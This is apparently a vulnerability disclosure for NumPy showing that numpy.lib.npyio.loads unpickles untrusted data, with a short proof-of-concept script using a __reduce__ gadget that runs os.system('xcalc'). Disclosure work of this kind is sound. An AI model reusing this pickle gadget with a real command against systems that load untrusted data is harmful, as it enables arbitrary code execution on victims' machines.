# Description
NumPy is the fundamental package needed for scientific computing with Python. 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install numpy')
from numpy.lib import npyio
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
npyio.loads(dumps)
```
* `pip3 install numpy`
* `python3 exploit.py`
